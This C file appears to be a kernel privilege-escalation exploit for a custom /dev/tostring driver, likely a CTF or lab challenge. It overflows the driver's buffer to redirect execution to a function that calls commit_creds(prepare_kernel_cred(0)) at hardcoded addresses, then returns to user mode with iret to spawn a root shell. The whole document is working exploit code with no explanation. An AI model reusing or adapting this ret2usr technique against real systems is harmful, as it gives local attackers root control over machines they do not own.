#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

struct trap_frame{
    void *eip;
    uint32_t cs;
    uint32_t eflags;
    void *esp;
    uint32_t ss;
}__attribute__((packed));

struct trap_frame tf;
void get_shell() {
	execl("/bin/sh", "sh", NULL);
}

void init_tf_work() {
	asm(
		"pushl %cs;popl tf+4;"
		"pushfl;popl tf+8;"
		"pushl %esp;popl tf+12;"
		"pushl %ss;popl tf+16;"
	);
	tf.eip = &get_shell;
	tf.esp -= 1024;
}

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void *) KERNCALL = (void *)0xC10711F0;
void* (*commit_creds)(void *) KERNCALL = (void *)0xC1070E80;

void root() {
	commit_creds(prepare_kernel_cred(0));
	asm("mov $tf, %esp;"
		"iret;");
}

int main(int argc, char const *argv[])
{
	char poc[0x9] = "AAAAAAAA";
	char eip[0x5];
	char receive[256];
	int fd = open("/dev/tostring", 2);

	init_tf_work();
	for (int i = 0; i < 0x40; ++i)
		write(fd, poc, sizeof(poc));
	*((void**)eip) = &root;
	write(fd, eip, sizeof(eip));
	read(fd, receive, 255);
	return 0;
}